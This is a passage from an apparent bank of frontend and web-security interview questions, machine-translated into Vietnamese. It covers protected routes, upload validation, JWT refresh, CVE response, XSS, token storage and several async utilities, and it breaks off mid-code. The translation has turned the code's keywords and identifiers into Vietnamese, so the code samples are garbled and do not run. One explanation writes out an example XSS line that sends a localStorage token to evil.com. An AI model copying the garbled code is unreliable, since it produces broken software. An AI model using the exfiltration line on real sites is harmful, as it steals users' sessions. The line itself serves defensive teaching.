    answer: '// Trình bao bọc tuyến đường được bảo vệ dựa trên vai trò\nhàm ProtectedRoute({\ntrẻ em,\nvai trò bắt buộc,\n}: {\ntrẻ em: React.ReactNode;\nvai trò bắt buộc?: chuỗi;\n}) {\nconst { người dùng, isLoading } = useAuth();\n\nif (isLoading) trả về <LoadingSpinner />;\nif (!user) return <Navigate to="/login" thay thế />;\nif (requiredRole && user.role !== requireRole) {\nreturn <Navigate to="/unauthorized" thay thế />;\n}\ntrả về <>{con</>;\n}\n\n// Các tuyến cố định\n<Tuyến đường>\n<Route path="/dashboard" element={\n<ProtectedRoute>\n<Bảng điều khiển />\n</ProtectedRoute>\n} />\n<Route path="/admin" element={\n<ProtectedRoute requireRole="admin">\n<Bảng quản trị />\n</ProtectedRoute>\n} />\n<Route path="/settings" phần tử={\n<ProtectedRoute>\n<Cài đặt />\n</ProtectedRoute>\n} />\n<Route path="/unauthorized" element={<UnauthorizedPage />} />\n</Tuyến>',
    explanation: 'Bộ bảo vệ tuyến đường phía máy khách là cần thiết cho UX nhưng KHÔNG đủ để bảo mật.Điểm quan trọng: **API cũng phải thực thi ủy quyền**.Người dùng độc hại có thể bỏ qua mọi hoạt động kiểm tra phía máy khách bằng cách gọi trực tiếp API.Bộ bảo vệ giao diện người dùng ngăn chặn việc truy cập ngẫu nhiên và cung cấp UX tốt (chuyển hướng đến đăng nhập hoặc hiển thị "trái phép").Phần phụ trợ phải xác minh vai trò JWT/phiên trên mọi điểm cuối API quản trị viên và trả về 403 Bị cấm đối với người dùng không phải quản trị viên.Chi tiết triển khai: (1) hook `useAuth` đọc trạng thái người dùng từ ngữ cảnh (được điền từ JWT hoặc API phiên).(2) `isLoading` ngăn trang đăng nhập nhấp nháy trong khi quá trình kiểm tra xác thực đang diễn ra.(3) `Điều hướng` bằng `thay thế` tránh đẩy tuyến đường được bảo vệ vào lịch sử trình duyệt.(4) Đối với các quyền phức tạp hơn (RBAC), hãy thay thế `requiredRole` bằng kiểm tra `permission`: `user.permissions.includes(requiredPermission)`.(5) Đồng thời ẩn các liên kết điều hướng quản trị viên đối với người dùng không phải quản trị viên để tránh nhầm lẫn (nhưng không bao giờ dựa vào giao diện người dùng ẩn để bảo mật).',
  },
  'atp-030': {
    question: 'Thiết kế xử lý tải lên tệp an toàn cho ứng dụng React.Người dùng có thể tải lên hình ảnh hồ sơ.Xác thực loại, kích thước và bảo vệ khỏi nội dung độc hại trên cả máy khách và máy chủ.',
    answer: 'Máy khách: xác thực loại MIME (thông qua byte ma thuật, không chỉ tiện ích mở rộng), thực thi giới hạn kích thước, xem trước trước khi tải lên.Máy chủ: xác thực lại mọi thứ, quét các tập lệnh nhúng, lưu trữ trong bộ lưu trữ biệt lập (S3) với tên tệp ngẫu nhiên, phân phát qua CDN với Content-Disposition: attachment.',
    explanation: 'Tải lên tập tin là một vectơ tấn công lớn.Bảo vệ theo chiều sâu: (1) Phía máy khách — kiểm tra `file.type` và `file.size` trước khi tải lên.Nhưng cũng đọc một vài byte đầu tiên (byte ma thuật) để xác minh loại tệp thực tế — đổi tên `malware.exe` thành `photo.jpg` sẽ thay đổi phần mở rộng nhưng không thay đổi byte ma thuật.Đối với hình ảnh, hãy kết xuất thành phần tử `<canvas>` để xác minh rằng đó là hình ảnh hợp lệ;các tập tin bị hỏng/độc hại sẽ không hiển thị được.Giới hạn kích thước tệp (ví dụ: 5 MB cho hình đại diện).(2) Phía máy chủ - KHÔNG BAO GIỜ tin tưởng vào việc xác thực ứng dụng khách.Kiểm tra lại loại MIME thông qua byte ma thuật (sử dụng thư viện `file-type` trong Node).Kiểm tra lại kích thước tập tin.Đối với hình ảnh, hãy mã hóa lại hình ảnh (ví dụ: thông qua sắc nét) để loại bỏ mọi tải trọng được nhúng (dữ liệu EXIF ​​​​có thể chứa tập lệnh, tệp polyglot có thể là cả JPEG hợp lệ và HTML hợp lệ).(3) Lưu trữ - lưu trữ trong S3 hoặc tương tự, không bao giờ lưu trữ trên hệ thống tệp máy chủ web.Sử dụng UUID ngẫu nhiên làm tên tệp để ngăn chặn việc truyền tải đường dẫn.Đặt `Content-Type` một cách rõ ràng khi phân phối (không bao giờ dựa vào phần mở rộng tệp).(4) Cung cấp - sử dụng `Bố trí nội dung: tệp đính kèm` để tải xuống hoặc phân phát từ một miền/CDN riêng để ngăn XSS thông qua các tệp HTML đã tải lên.Thêm CSP `script-src` để chặn thực thi tập lệnh trong nội dung được tải lên.(5) Quét vi-rút — đối với các ứng dụng có tính bảo mật cao, hãy tải lên đường ống thông qua ClamAV hoặc dịch vụ quét đám mây trước khi chấp nhận.',
  },
  'atp-031': {
    question: 'Người dùng đang điền vào một biểu mẫu dài (hơn 15 trường).Mã thông báo truy cập JWT của họ hết hạn ở dạng giữa.Khi họ gửi, họ nhận được 401. Triển khai làm mới mã thông báo để bảo toàn dữ liệu biểu mẫu và thử gửi lại mà người dùng không nhận thấy.',
    answer: 'let isRefreshing = false;\nlet failedQueue: Array<{\ngiải quyết: (mã thông báo: chuỗi) => void;\ntừ chối: (err: Error) => void;\n}> = [];\n\nhàm processQueue(lỗi: Lỗi | null, mã thông báo: chuỗi | null) {\nfailedQueue.forEach(({ giải quyết, từ chối }) => {\nlỗi?từ chối(lỗi): giải quyết(mã thông báo!);\n});\nfailedQueue = [];\n}\n\napi.interceptors.response.use(\n(phản hồi) => phản hồi,\nkhông đồng bộ (lỗi) => {\nconst originalRequest = error.config;\n\nif (error.response?.status !== 401 || originalRequest._retry) {\ntrả về Promise.reject (lỗi);\n}\n\nnếu (isRefreshing) {\n// Xếp hàng yêu cầu này cho đến khi quá trình làm mới hoàn tất\nreturn new Promise((giải quyết, từ chối) => {\nfailedQueue.push({\ngiải quyết: (mã thông báo: chuỗi) => {\noriginalRequest.headers.Authorization = `Người mang ${token}`;\ngiải quyết (api (originRequest));\n},\ntừ chối,\n});\n});\n}\n\noriginalRequest._retry = true;\nisRefreshing = đúng;\n\nthử {\nconst { data } = đang chờ axios.post(\'/auth/refresh\', {\nlàm mớiToken: getRefreshToken(),\n});\nconst newToken = data.accessToken;\nsetAccessToken(newToken);\napi.defaults.headers.common.Authorization = `Bearer ${newToken}`;\nprocessQueue(null, newToken);\noriginalRequest.headers.Authorization = `Người mang ${newToken}`;\ntrả về api(originRequest);\n} bắt (refreshError) {\nprocessQueue(refreshError as Error, null);\n// Mã thông báo làm mới cũng đã hết hạn - chuyển hướng đến đăng nhập\nđăng xuất();\ntrả về Promise.reject(refreshError);\n} cuối cùng {\nisRefreshing = sai;\n}\n}\n);',
    explanation: 'Thiết bị chặn này xử lý việc hết hạn mã thông báo một cách minh bạch mà không làm gián đoạn người dùng.Cơ chế chính: (1) Vào ngày 401, thiết bị chặn cố gắng làm mới mã thông báo bằng cách sử dụng mã thông báo làm mới (được lưu trữ trong cookie HttpOnly hoặc bộ lưu trữ an toàn).(2) Cờ `_retry` ngăn các vòng lặp vô hạn nếu bản thân quá trình làm mới trả về 401. (3) Cơ chế xếp hàng rất quan trọng đối với các yêu cầu đồng thời: nếu 5 yêu cầu không thành công với 401 đồng thời thì chỉ có một lệnh gọi làm mới được thực hiện.4 cái còn lại chờ trong hàng đợi và được phát lại bằng mã thông báo mới sau khi làm mới thành công.(4) Cấu hình yêu cầu ban đầu (bao gồm nội dung POST, tiêu đề, URL) được giữ nguyên và thử lại - dữ liệu biểu mẫu không bao giờ bị mất.(5) Nếu mã thông báo làm mới cũng hết hạn, người dùng sẽ đăng xuất.(6) Điều này là vô hình đối với mã thành phần - Promise gửi biểu mẫu sẽ giải quyết thành công sau khi thử lại, như thể mã thông báo không bao giờ hết hạn.Người dùng không bao giờ thấy lỗi hoặc mất dữ liệu.',
  },
  'atp-032': {
    question: 'Gói npm của bên thứ ba mà ứng dụng của bạn phụ thuộc có lỗ hổng nghiêm trọng (CVE) đã biết.Xem qua quá trình phản hồi hoàn chỉnh của bạn từ khám phá đến giải quyết.',
    answer: 'Phân loại mức độ nghiêm trọng và khả năng khai thác, kiểm tra xem việc sử dụng của bạn có bị ảnh hưởng hay không, vá/thay thế/giảm thiểu ngay lập tức, thông báo cho các bên liên quan, cập nhật các phần phụ thuộc, thêm các biện pháp bảo vệ để ngăn ngừa tái diễn.',
    explanation: 'Quy trình ứng phó sự cố: (1) Khám phá & phân loại (giờ 1) — `npm Audit` hoặc Snyk/Dependabot cảnh báo cho bạn.Kiểm tra chi tiết CVE: lỗ hổng (RCE, XSS, ô nhiễm nguyên mẫu) là gì?Những phiên bản nào bị ảnh hưởng?Có bản vá không?(2) Đánh giá tác động (giờ 1-2) - mã của bạn có sử dụng chức năng dễ bị tấn công không?Tìm kiếm các mẫu nhập và sử dụng.Lỗ hổng trong gói bạn nhập nhưng không sử dụng API bị ảnh hưởng có mức độ ưu tiên thấp hơn.(3) Giảm thiểu ngay lập tức — nếu có bản vá: cập nhật gói, chạy thử nghiệm, triển khai.Nếu không có bản vá: hãy kiểm tra một nhánh, áp dụng `npm ghi đè`/`độ phân giải` để buộc phiên bản phụ thuộc phụ an toàn hoặc thay thế gói.Nếu việc thay thế phức tạp: hãy thêm một giải pháp thay thế (ví dụ: làm sạch đầu vào trước khi gọi hàm dễ bị tấn công).(4) Liên lạc — thông báo cho nhóm bảo mật của bạn, ghi lại CVE vào nhật ký sự cố của bạn, thông báo cho người dùng bị ảnh hưởng nếu dữ liệu có thể bị xâm phạm (yêu cầu GDPR/SOC2).(5) Phòng ngừa - thêm `npm Audit` vào quy trình CI và chặn việc hợp nhất trên các lỗ hổng nghiêm trọng.Sử dụng Dependabot/Renovate để cập nhật phần phụ thuộc tự động.Xem lại cây phụ thuộc - giảm thiểu các phụ thuộc bắc cầu.Hãy cân nhắc sử dụng `Socket.dev` để phát hiện cuộc tấn công chuỗi cung ứng.(6) Khám nghiệm tử thi - tại sao phiên bản dễ bị tấn công lại được sử dụng?Cập nhật tự động có bị tắt không?Cập nhật quy trình để ngăn ngừa tái diễn.',
  },
  'atp-033': {
    question: 'Cách nào sau đây là cách bảo vệ hiệu quả nhất chống lại XSS trong ứng dụng React?',
    answer: '1',
    explanation: 'Mặc dù React tự động thoát khỏi các biểu thức JSX (tùy chọn C), nhưng KHÔNG thể tạo XSS trong React - `nguy hiểmSetInnerHTML`, `href` với các URL `javascript:` và thao tác DOM dựa trên ref đều bỏ qua việc thoát.Xác thực phía máy chủ (tùy chọn D) là quan trọng nhưng không đủ vì XSS là vấn đề mã hóa đầu ra, không phải vấn đề xác thực đầu vào.Thoát đầu vào (tùy chọn A) hữu ích nhưng dễ bị lỗi - nhà phát triển quên hoặc thoát kép.CSP (tùy chọn B) là biện pháp bảo vệ hiệu quả nhất vì nó hoạt động ở cấp trình duyệt: ngay cả khi kẻ tấn công chèn thẻ tập lệnh hoặc trình xử lý nội tuyến, trình duyệt sẽ từ chối thực thi nó nếu vi phạm chính sách CSP.Một CSP nghiêm ngặt như `script-src \'self\';object-src \'none\'` chặn tất cả các tập lệnh nội tuyến và chỉ cho phép các tập lệnh từ nguồn gốc của bạn.Kết hợp với tính năng thoát mặc định của React và cách xử lý thích hợp `nguy hiểmSetInnerHTML`, CSP cung cấp khả năng phòng thủ theo chiều sâu để phát hiện những lỗi mà các lớp khác bỏ qua.',
  },
  'atp-034': {
    question: 'Biểu mẫu đăng nhập này lưu trữ mã thông báo xác thực trong localStorage.Một người đánh giá bảo mật đã gắn cờ nó.Lỗ hổng là gì và bạn khắc phục nó như thế nào?',
    answer: 'localStorage có thể truy cập được bằng bất kỳ JavaScript nào trên trang, bao gồm cả tải trọng XSS và tập lệnh của bên thứ ba.Nếu kẻ tấn công tiêm JS (thông qua XSS, CDN bị xâm nhập hoặc tiện ích mở rộng trình duyệt độc hại), chúng có thể đánh cắp mã thông báo bằng `localStorage.getItem("authToken")`.Khắc phục: lưu trữ mã thông báo trong cookie HttpOnly (JS không thể truy cập) và sử dụng cờ SameSite + Secure.',
    explanation: 'localStorage không có quyền kiểm soát truy cập - mọi tập lệnh chạy trên nguồn gốc của bạn đều có thể đọc được.Các vectơ tấn công: (1) Lỗ hổng XSS cho phép kẻ tấn công chạy `fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"))`.(2) Tập lệnh của bên thứ ba bị xâm phạm (phân tích, tiện ích trò chuyện) được bao gồm qua CDN có thể lọc tất cả dữ liệu localStorage.(3) Tiện ích mở rộng trình duyệt có quyền truy cập tập lệnh nội dung có thể đọc localStorage.Khắc phục: (1) Lưu trữ mã thông báo truy cập trong các cookie httpOnly, Secure, SameSite=Strict.Trình duyệt sẽ tự động gửi chúng và JavaScript không thể truy cập chúng.(2) Đối với các SPA trên các miền khác với API, hãy sử dụng mẫu BFF (Backend For Frontend): một proxy phía máy chủ mỏng có cùng nguồn gốc với SPA giữ mã thông báo trong các phiên phía máy chủ và các yêu cầu API proxy có mã thông báo được đính kèm.(3) Nếu bạn phải sử dụng mã thông báo phía máy khách (ví dụ: đối với API của bên thứ ba), hãy giữ chúng trong bộ nhớ (ngữ cảnh đóng hoặc bối cảnh React) - chúng tồn tại khi điều hướng trang thông qua định tuyến SPA nhưng bị xóa khi đóng tab, hạn chế cửa sổ tấn công.',
  },
  'atp-035': {
    question: 'Triển khai lớp giới hạn tốc độ cho phép tối đa N cuộc gọi mỗi giây.Nếu vượt quá giới hạn, cuộc gọi sẽ được xếp hàng đợi hoặc bị từ chối (có thể định cấu hình).Bao gồm phương thức `flush` để xử lý các cuộc gọi được xếp hàng đợi.',
    answer: 'lớp RateLimiter {\nmaxPerSecond riêng tư: số;\nchế độ riêng tư: \'xếp hàng\' |\'từ chối\';\ndấu thời gian riêng tư: number[] = [];\nhàng đợi riêng: Mảng<{\nfn: () => Promise<unknown>;\ngiải quyết: (giá trị: không xác định) => void;\ntừ chối: (lỗi: Lỗi) => void;\n}> = [];\nhẹn giờ riêng: ReturnType<typeof setTimeout> |null = null;\n\nconstructor(maxPerSecond: số, mode: \'queue\' | \'reject\' = \'queue\') {\nthis.maxPerSecond = maxPerSecond;\nthis.mode = chế độ;\n}\n\nasync exec<T>(fn: () => Promise<T>): Promise<T> {\nconst bây giờ = Date.now();\n// Xóa dấu thời gian cũ hơn 1 giây\nthis.timestamps = this.timestamps.filter((t) => now - t < 1000);\n\nif (this.timestamps.length < this.maxPerSecond) {\nthis.timestamps.push(bây giờ);\ntrả về fn();\n}\n\nif (this.mode === \'từ chối\') {\nném Lỗi mới (\'Vượt quá giới hạn tỷ lệ\');\n}\n\n// Chế độ xếp hàng - đợi cho đến khi một chỗ trống mở ra\nreturn new Promise<T>((giải quyết, từ chối) => {\nthis.queue.push({\nfn,\ngiải quyết: giải quyết dưới dạng (giá trị: không xác định) => void,\ntừ chối,\n});\nthis.scheduleFlush();\n});\n}\n\nlịch trình riêng tưFlush() {\nif (this.timer) trả về;\nconst lâu đời nhất = this.timestamps[0];\nđộ trễ const = cũ nhất?Math.max(0, 1000 - (Date.now() - cũ nhất)) : 0;\nthis.timer = setTimeout(() => {\nthis.timer = null;\nthis.flush();\n}, độ trễ +10);\n}\n\nxả() {\nconst bây giờ = Date.now();\nthis.timestamps = this.timestamps.filter((t) => now - t < 1000);\n\nwhile (this.queue.length && this.timestamps.length < this.maxPerSecond) {\nconst item = this.queue.shift()!;\nthis.timestamps.push(bây giờ);\nitem.fn().then(item.resolve).catch(item.reject);\n}\n\nif (this.queue.length) this.scheduleFlush();\n}\n}',
    explanation: 'Giới hạn tốc độ là điều cần thiết cho các lệnh gọi API để tránh đạt giới hạn tốc độ máy chủ (429 phản hồi).Thuật toán cửa sổ trượt theo dõi dấu thời gian cuộc gọi trong giây cuối cùng.Nếu số lượng dưới mức giới hạn, cuộc gọi sẽ tiếp tục ngay lập tức.Nếu không, có hai hành vi: (1) Chế độ từ chối - ném ngay lập tức, phù hợp với các cuộc gọi không quan trọng trong đó người gọi xử lý lỗi.(2) Chế độ xếp hàng - đệm cuộc gọi và xử lý cuộc gọi khi một khe mở ra, phù hợp cho hoạt động đồng bộ hóa nền hoặc hàng loạt.Phương thức `scheduleFlush` tính toán thời điểm dấu thời gian cũ nhất sẽ hết hạn (mở một vị trí) và lên lịch xử lý sau đó.Chi tiết chính: cửa sổ trượt (lọc dấu thời gian < 1 giây trước) chính xác hơn bộ đếm cửa sổ cố định, có thể cho phép tốc độ gấp đôi ở ranh giới cửa sổ.Trong quá trình sản xuất, mẫu này được sử dụng cho ngân sách lệnh gọi API, ngăn chặn việc lạm dụng trong việc cộng tác chỉnh sửa và điều chỉnh các phép tính tốn kém.',
  },
  'atp-036': {
    question: 'Xây dựng hàng đợi thử lại để lưu trữ các hoạt động API không thành công trong IndexedDB và xử lý chúng khi thiết bị trực tuyến trở lại.Xử lý thành công một phần khi thử lại hàng loạt.',
    answer: 'giao diện Thất bại hoạt động {\nid: chuỗi;\nurl: chuỗi;\nphương thức: chuỗi;\ncơ thể?: chuỗi;\ntiêu đề?: Bản ghi<chuỗi, chuỗi>;\ndấu thời gian: số;\nthử lại: số;\n}\n\nlớp Ngoại tuyếnRetryQueue {\nriêng dbName = \'thử lại hàng đợi\';\nstoreName = \'hoạt động\';\nmaxRetries riêng tư = 5;\nriêng tư isProcessing = false;\n\nhàm tạo() {\nwindow.addEventListener(\'online\', () => this.processQueue());\n// Đồng thời thử thay đổi mức độ hiển thị (tiêu điểm lại tab)\ndocument.addEventListener(\'visibilitychange\', () => {\nif (document.visibilityState === \'visible\' && navigator.onLine) {\nthis.processQueue();\n}\n});\n}\n\nasync riêng tư getDb(): Promise<IDBDatabase> {\nreturn new Promise((giải quyết, từ chối) => {\nconst req = indexedDB.open(this.dbName, 1);\nreq.onupgradeed = () => {\nreq.result.createObjectStore(this.storeName, { keyPath: \'id\' });\n};\nreq.onsuccess = () => giải quyết(req.result);\nreq.onerror = () => từ chối(req.error);\n});\n}\n\nasync enqueue(hoạt động: Bỏ qua<FailedOperation, \'id\' | \'dấu thời gian\' | \'thử lại\'>) {\nconst db = đang chờ this.getDb();\nconst op: FailedOperation = {\n...hoạt động,\nid: crypto.randomUUID(),\ndấu thời gian: Date.now(),\nthử lại: 0,\n};\nconst tx = db.transaction(this.storeName, \'readwrite\');\ntx.objectStore(this.storeName).put(op);\nreturn new Promise<void>((giải quyết, từ chối) => {\ntx.oncomplete = () => giải quyết();\ntx.onerror = () => từ chối(tx.error);\n});\n}\n\nquá trình không đồng bộQueue() {\nif (this.isProcessing || !navigator.onLine) return;\nthis.isProcessing = true;\n\nthử {\nconst db = đang chờ this.getDb();\nconst tx = db.transaction(this.storeName, \'chỉ đọc\');\nconst store = tx.objectStore(this.storeName);\nhoạt động const: FailedOperation[] = đang chờ Promise mới ((giải quyết) => {\nconst req = store.getAll();\nreq.onsuccess = () => giải quyết(req.result);\n});\n\n// Sắp xếp theo dấu thời gian - xử lý cũ nhất trước\nhoạt động.sort((a, b) => a.timestamp - b.timestamp);\n\nfor (const op của hoạt động) {\nthử {\nconst res = đang chờ tìm nạp(op.url, {\nphương thức: op.method,\ncơ thể: op.body,\ntiêu đề: op.headers,\n});\n\nnếu (res.ok) {\nđang chờ this.remove(op.id);\n} khác nếu (res.status < 500) {\n// Lỗi máy khách — xóa, không thử lại\nđang chờ this.remove(op.id);\n} khác {\nđang chờ this.incrementRetry(op);\n}\n} bắt {\n// Lỗi mạng - dừng xử lý, sẽ thử lại khi trực tuyến\nif (!navigator.onLine) bị hỏng;\nđang chờ this.incrementRetry(op);\n}\n}\n} cuối cùng {\nthis.isProcessing = false;\n}\n}\n\nxóa async riêng tư (id: string) {\nconst db = đang chờ this.getDb();\nconst tx = db.transaction(this.storeName, \'readwrite\');\ntx.objectStore(this.storeName).delete(id);\n}\n\ngia tăng không đồng bộ riêng tưRetry(op: FailedOperation) {\nif (op.retries >= this.maxRetries) {\nđang chờ this.remove(op.id);\nconsole.error(\'Thao tác thất bại vĩnh viễn:\', op);\ntrở lại;\n}\nconst db = đang chờ this.getDb();\nconst tx = db.transaction(this.storeName, \'readwrite\');\ntx.objectStore(this.storeName).put({ ...op, retries: op.retries + 1 });\n}\n}',
    explanation: 'Các ứng dụng ngoại tuyến đầu tiên cần có hàng đợi hoạt động bền bỉ để tồn tại khi làm mới trang và khởi động lại ứng dụng.IndexedDB được sử dụng vì: (1) nó tồn tại qua các phiên (không giống như hàng đợi trong bộ nhớ), (2) nó có thể lưu trữ dữ liệu có cấu trúc (không giống như localStorage chỉ ở dạng chuỗi), (3) nó có nhiều dung lượng lưu trữ hơn (thường là hơn 50% dung lượng ổ đĩa so với 5-10 MB đối với localStorage).Các quyết định thiết kế chính: xử lý các hoạt động cũ nhất trước tiên để duy trì ngữ nghĩa trật tự.Dừng xử lý khi mất mạng giữa hàng đợi để tránh lãng phí số lần thử lại.Phân biệt lỗi máy khách (4xx — không bao giờ thử lại, yêu cầu sai) với lỗi máy chủ (5xx — thử lại sau).Giới hạn `maxRetries` ngăn các hoạt động của zombie thử lại mãi mãi.Mutex `isProcessing` ngăn chặn việc xử lý trùng lặp nếu nhiều sự kiện trực tuyến xảy ra.Trong quá trình sản xuất, hãy thêm: tính năng loại bỏ trùng lặp thao tác (khóa tạm thời), mức độ ưu tiên, thời gian chờ theo cấp số nhân giữa các lần thử và hàng đợi thư chết cho các hoạt động bị lỗi vĩnh viễn với thông báo giao diện người dùng.',
  },
  'atp-037': {
    question: 'Triển khai máy trạng thái cho quy trình thanh toán gồm nhiều bước với các trạng thái sau: giỏ hàng → vận chuyển → thanh toán → xác nhận → (xong | lỗi).Bao gồm các điều kiện bảo vệ, tác dụng phụ và khả năng quay trở lại.',
    answer: 'gõ CheckoutState = \'giỏ hàng\' |\'vận chuyển\' |\'thanh toán\' |\'xác nhận\' |\'xong\' |\'lỗi\';\n\ngiao diện TransitionConfig {\nmục tiêu: CheckoutState;\nbảo vệ?: () => boolean;\nhiệu ứng?: () => void |Hứa<void>;\n}\n\ngõ TransitionMap = Một phần<Record<\'NEXT\' |\'Trở lại\' |\'LỖI\' |\'THỬ LẠI\', TransitionConfig>>;\n\nconst machineConfig: Record<CheckoutState, TransitionMap> = {\ngiỏ hàng: {\nTIẾP THEO: {\nmục tiêu: \'vận chuyển\',\nbảo vệ: () => getCartItems().length > 0,\nhiệu ứng: () => Analytics.track(\'checkout_started\'),\n},\n},\nvận chuyển: {\nTIẾP THEO: {\nmục tiêu: \'thanh toán\',\nbảo vệ: () => isShippingValid(),\n},\nTRỞ LẠI: { target: \'cart\' },\n},\nthanh toán: {\nTIẾP THEO: {\nmục tiêu: \'xác nhận\',\nbảo vệ: () => isPaymentValid(),\nhiệu ứng: async () => { đang chờ processPayment();},\n},\nTRỞ LẠI: { target: \'shipping\' },\nLỖI: { mục tiêu: \'lỗi\' },\n},\nxác nhận: {\nTIẾP THEO: {\nmục tiêu: \'xong\',\nhiệu ứng: async() => { đang chờ createOrder();},\n},\nTRỞ LẠI: { mục tiêu: \'thanh toán\' },\nLỖI: { mục tiêu: \'lỗi\' },\n},\nxong: {},\nlỗi: {\nTHỬ LẠI: { target: \'thanh toán\' },\nTRỞ LẠI: { target: \'cart\' },\n},\n};\n\nlớp CheckoutMachine {\ntrạng thái riêng tư: CheckoutState = \'cart\';\nngười nghe riêng tư: Array<(from: CheckoutState, to: CheckoutState) => void> = [];\n\ngetState(): CheckoutState {\ntrả lại this.state;\n}\n\nonTransition(cb: (từ: CheckoutState, tới: CheckoutState) => void) {\nthis.listeners.push(cb);\ntrả về () => {\nthis.listeners = this.listeners.filter((l) => l !== cb);\n};\n}\n\ngửi không đồng bộ (sự kiện: \'TIẾP THEO\' | \'BACK\' | \'LỖI\' | \'RETRY\'): Promise<boolean> {\nchuyển tiếp const = machineConfig[this.state];\nchuyển đổi const = chuyển tiếp [sự kiện];\n\nif (!transition) trả về sai;// Chuyển đổi không hợp lệ cho trạng thái hiện tại\nif (transition.guard && !transition.guard()) trả về sai;// Người bảo vệ bị từ chối\n\nconst from = this.state;\n\nthử {\nif (transition.effect) đang chờ transition.effect();\nthis.state = transition.target;\nthis.listeners.forEach((cb) => cb(from, this.state));\ntrả về đúng sự thật;\n} bắt {\nthis.state = \'lỗi\';\nthis.listeners.forEach((cb) => cb(from, \'error\'));\ntrả về sai;\n}\n}\n\nasync next() { return this.send(\'NEXT\');}\nasync back() { return this.send(\'BACK\');}\n}',
    explanation: 'Máy trạng thái loại bỏ toàn bộ loại lỗi trong quy trình gồm nhiều bước: chuyển đổi trạng thái không hợp lệ (chuyển trực tiếp từ giỏ hàng sang xác nhận), thiếu bảo vệ (gửi thanh toán mà không điền thông tin vận chuyển) và trạng thái không rõ ràng (biểu mẫu có gửi không? bị lỗi? đã thành công?).Cấu hình khai báo làm cho luồng có thể nhìn thấy được trong nháy mắt và dễ sửa đổi.Các tính năng chính: (1) Các điều kiện bảo vệ ngăn chặn các chuyển đổi không hợp lệ (không thể tiếp tục từ giỏ hàng nếu nó trống).(2) Các tác dụng phụ (phân tích, lệnh gọi API) được gắn với các chuyển đổi cụ thể, không nằm rải rác trong mã thành phần.(3) Hiệu ứng không đồng bộ với việc xử lý lỗi — nếu `processPayment()` ném ra, máy sẽ tự động chuyển sang trạng thái lỗi.(4) Phương thức `back()` chỉ hoạt động khi được cấu hình rõ ràng.(5) Mẫu trình nghe cho phép tích hợp React thông qua `useSyncExternalStore` hoặc trình bao bọc useState đơn giản.Đối với các luồng phức tạp, hãy xem xét XState (thư viện máy trạng thái đầy đủ tính năng), nhưng việc triển khai nhẹ nhàng này thường đủ và dễ giải thích hơn.',
  },
  'atp-038': {
    question: 'Triển khai polyfill `Promise.allSettled` từ đầu.Sau đó, sử dụng nó để thực hiện hàng loạt 10 lệnh gọi API trong đó một số lệnh gọi có thể không thành công và trả về bản tóm tắt thành công cũng như thất bại.',
    answer: 'hàm allSettled<T>(lời hứa: Promise<T>[]): Promise<Array<\n{ trạng thái: \'đã hoàn thành\';giá trị: T } |{ trạng thái: \'bị từ chối\';lý do: không rõ }\n>> {\ntrả lại Promise mới ((giải quyết) => {\nif (promises.length === 0) { giải quyết ([]);trở lại;}\n\nkết quả const: Mảng<\n{ trạng thái: \'đã hoàn thành\';giá trị: T } |{ trạng thái: \'bị từ chối\';lý do: không rõ }\n> = Mảng mới(promises.length);\nhãy còn lại = lời hứa.length;\n\nPromise.forEach((hứa, chỉ mục) => {\nPromise.resolve(lời hứa)\n.then((giá trị) => {\nkết quả[chỉ mục] = { trạng thái: \'đã hoàn thành\', giá trị };\n})\n.catch((lý do) => {\nkết quả[chỉ mục] = { trạng thái: \'bị từ chối\', lý do };\n})\n.cuối cùng(() => {\ncòn lại--;\nif (còn lại === 0) giải quyết (kết quả);\n});\n});\n});\n}\n\nhàm async batchFetch(urls: string[]) {\nkết quả const = đang chờ allSettled(\nurls.map((url) =>\ntìm nạp(url).then((r) => {\nif (!r.ok) ném Lỗi mới(`HTTP ${r.status}`);\nreturn { url, data: r.json() };\n})\n)\n);\n\nconst đã thành công: string[] = [];\nconst không thành công: Mảng<{ url: string;lỗi: chuỗi }> = [];\n\nresults.forEach((result, i) => {\nif (result.status === \'đã hoàn thành\') {\nđã thành công.push(urls[i]);\n} khác {\nfailed.push({ url: urls[i], error: String(result.reason) });\n}\n});\n\nreturn { thành công, thất bại };\n}',
    explanation: 'Thông tin chi tiết quan trọng về `allSettled` so với `all`: `Promise.all` từ chối ở lần thất bại đầu tiên, mất kết quả từ những lời hứa đã thành công hoặc vẫn đang chờ xử lý.`allSettled` đợi TẤT CẢ lời hứa hoàn thành và trả về mọi kết quả.Chi tiết triển khai: (1) `Promise.resolve(promise)` gói đầu vào trong trường hợp đó không phải là một lời hứa (xử lý các giá trị không thể sau đó).(2) Mảng kết quả duy trì thứ tự chèn thông qua chỉ mục, mặc dù các lời hứa được giải quyết theo thứ tự tùy ý.(3) Mẫu bộ đếm (`còn lại--`) đơn giản và đáng tin cậy hơn so với việc kiểm tra `results.filter(Boolean).length` không thành công nếu kết quả là giá trị sai.Hàm `batchFetch` thể hiện cách sử dụng thực tế: thực hiện 10 lệnh gọi API trong đó 2 lệnh có thể thất bại sẽ không ngăn cản 8 lệnh gọi còn lại thành công.Đối tượng tóm tắt cung cấp cho người gọi một giao diện rõ ràng để hiển thị "8 thành công, 2 thất bại" kèm theo chi tiết lỗi.',
  },
  'atp-039': {
    question: 'Triển khai lớp bộ nhớ đệm và sao chép yêu cầu chung (như SWR đơn giản) để: lưu các phản hồi vào bộ nhớ đệm theo khóa, loại bỏ các yêu cầu trùng lặp trong quá trình thực hiện, hỗ trợ TTL và cung cấp chức năng `mutate` để vô hiệu hóa các mục nhập bộ nhớ đệm.',
    answer: 'giao diện CacheEntry<T = không xác định> {\ndữ liệu: T;\ndấu thời gian: số;\nttl: số;\n}\n\nlớp Yêu cầuCache {\nbộ đệm riêng = Bản đồ mới<string, CacheEntry>();\nchuyến bay riêng tư = Bản đồ mới<string, Promise<unknown>>();\nmặc định riêngTTL: số;\n\nhàm tạo (defaultTTL = 60000) {\nthis.defaultTTL = defaultTTL;\n}\n\ntìm nạp không đồng bộ<T>(\nkhóa: chuỗi,\ntrình tìm nạp: () => Promise<T>,\nttl = this.defaultTTL\n): Hứa<T> {\n// 1. Kiểm tra bộ đệm\nconst được lưu trong bộ nhớ cache = this.cache.get(key);\nif (được lưu trong bộ nhớ cache && Date.now() - cached.timestamp < cached.ttl) {\ntrả về cached.data dưới dạng T;\n}\n\n// 2. Loại bỏ các yêu cầu trùng lặp trong chuyến bay\nif (this.inflight.has(key)) {\ntrả lại this.inflight.get(key) dưới dạng Promise<T>;\n}\n\n// 3. Thực thi trình tìm nạp\nlời hứa const = người tìm nạp()\n.then((dữ liệu) => {\nthis.cache.set(key, { data, timestamp: Date.now(), ttl });\ntrả về 